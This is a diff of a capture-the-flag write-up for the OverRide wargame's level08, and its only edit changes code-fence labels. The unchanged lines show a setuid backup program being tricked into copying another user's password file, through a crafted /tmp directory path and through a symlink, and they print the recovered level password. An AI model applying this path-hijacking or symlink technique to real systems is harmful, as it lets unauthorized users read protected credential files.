@@ -1,6 +1,6 @@
 # Hijacking relative path / Exploit symbolic link
 
-```sh
+```shell
 ┌──$ [~/42/2022/override]
 └─>  ssh 192.168.56.101 -p 4242 -l level08
            ____                  ____  _     __
@@ -28,7 +28,7 @@ Other way is to create a symbolic link to `/home/users/level09/.pass` and pass t
 
 ## Exploit
 By creating new `./backups/` folder in `/tmp`
-```sh
+```shell
 level08@OverRide:/tmp$ cd /tmp/
 level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
 level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
@@ -36,7 +36,7 @@ level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
 ```
 With symbolic link
-```sh
+```shell
 level08@OverRide:~$ chmod +rwx .
 level08@OverRide:~$ ln -s /home/users/level09/.pass pass
 level08@OverRide:~$ ./level08 pass
